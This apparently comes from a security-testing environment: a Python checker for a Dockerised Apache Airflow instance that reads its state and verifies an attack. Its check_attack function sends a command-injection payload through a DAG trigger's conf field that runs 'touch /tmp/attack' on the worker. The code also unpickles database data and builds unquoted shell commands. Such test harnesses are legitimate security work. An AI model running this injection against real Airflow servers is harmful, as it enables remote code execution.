import requests
from sqlalchemy import create_engine
from basic.server_state import ServerState
from docker import DockerClient
import os
import json
import pandas as pd
import pickle
import time
import re

def hc_single(scene) -> bool:
    success = False
    try:

        http_port = scene.target_container['ports'][0]
        response = requests.get(f"http://localhost:{http_port}/admin")
        #print(response.text)
        if response.status_code == 200 and "Airflow - DAGs" in response.text:
            success = True

    except (StopIteration, requests.RequestException):
        return False
    
    return success

def get_files_and_folders_from_docker(container_name, directory):
    client = DockerClient.from_env()
    container = client.containers.get(container_name)

    check_cmd = f'ls "{directory}"'
    check_result = container.exec_run(check_cmd)
    if check_result.exit_code != 0:
        return []

    file_cmd = f'find {directory} -maxdepth 1 -type f'
    files = container.exec_run(file_cmd)
    file_list = files.output.decode().strip().split('\n')
    
    # 获取目录下所有文件夹（排除自身）
    dir_cmd = f'find {directory} -maxdepth 1 -type d ! -path {directory}'
    dirs = container.exec_run(dir_cmd)
    dir_list = dirs.output.decode().strip().split('\n')

    results = []

    for file_path in file_list:
        if not file_path.strip():
            continue
        cat_cmd = f'cat {file_path}'
        file_content = container.exec_run(cat_cmd, demux=True)
        content_bytes = file_content.output[0] if file_content.output else b''
        file_name = os.path.basename(file_path)
        results.append({'file_name': file_name, 'content': content_bytes})

    for dir_path in dir_list:
        if not dir_path.strip():
            continue
        dir_name = os.path.basename(dir_path)
        results.append({'file_name': dir_name, 'content': b''})

    return results


def get_state(container_name: str, http_port: int = 0, db_port: int = 0, save_tag = "demo") -> ServerState:
    """
    airflow容器状态获取
    """
    from basic.table import Table
    conn_str = f'postgresql+psycopg2://airflow:airflow@localhost:{db_port}/airflow'
    engine = create_engine(conn_str)
    db_state = []

    dag_df = pd.read_sql('SELECT dag_id, is_paused FROM dag', engine)
    for i, row in dag_df.iloc[:21].iterrows():
        row_df = pd.DataFrame([row])
        dag_id_value = row['dag_id']
        table_name = f"dag.{dag_id_value}"
        dag_split_table = Table.from_pd_dataframe(row_df, table_name)
        db_state.append(dag_split_table)

    dag_run_df = pd.read_sql(
        "SELECT id, dag_id, state, encode(conf, 'hex') AS conf_hex FROM dag_run",
        engine
    )
    def try_decode_conf(hex_str):
        try:
            if not hex_str:
                return None
            conf_bytes = bytes.fromhex(hex_str)
            obj = pickle.loads(conf_bytes)
            return json.dumps(obj)
        except Exception as e:
            return None
    dag_run_df['conf_json'] = dag_run_df['conf_hex'].apply(try_decode_conf)
    dag_run_final = dag_run_df[['id', 'dag_id', 'state','conf_json']]

    dag_run_table = Table.from_pd_dataframe(dag_run_final, 'dag_run')
    db_state.append(dag_run_table)
    airflow_state = ServerState(file_state=[], db_state=db_state)
    return airflow_state

def check_attack(http_port: int, container_id: str = "", session: requests.Session = None, db_port: int = 0) -> bool:
    try:
        url = f"http://localhost:{http_port}/admin"
        resp0 = session.get(url)
        match = re.search(r'var CSRF\s*=\s*"([^"]+)"', resp0.text)
        csrf = ""
        if match:
            csrf = match.group(1)

        url = f"http://localhost:{http_port}/admin/airflow/trigger"
        conf_json = '{"message": "\'\\";touch /tmp/attack;#"}'
        data = {
            "dag_id": "example_trigger_target_dag",
            "conf": conf_json,
            "csrf_token": csrf
        }
        resp3 = session.post(url, data=data)

        client = DockerClient.from_env()
        container = client.containers.get(container_id)
        worker_container_name = container.name.replace("airflow-webserver", "airflow-worker")
        time.sleep(15)
        file_list = get_files_and_folders_from_docker(worker_container_name, "/tmp")
        for file in file_list:
            if "attack" in file['file_name']:
                return True
        return False
    except Exception as e:
        return False
